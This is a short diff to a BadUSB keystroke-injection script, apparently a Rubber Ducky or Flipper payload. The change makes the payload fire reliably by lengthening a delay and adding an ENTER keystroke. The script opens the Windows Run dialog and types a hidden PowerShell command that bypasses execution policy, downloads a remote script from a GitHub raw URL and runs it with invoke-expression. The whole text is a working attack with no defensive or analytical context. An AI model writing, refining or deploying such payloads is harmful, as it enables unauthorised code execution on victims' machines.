@@ -12,7 +12,8 @@ REM ------------------------------------
 DELAY 100
 
 GUI r
-DELAY 200
+DELAY 500
 
 REM Download and run script
 STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/P-ict0/BadUSB-Scripts/main/helpers/francer/francer.ps1?dl=1; invoke-expression $pl
+ENTER
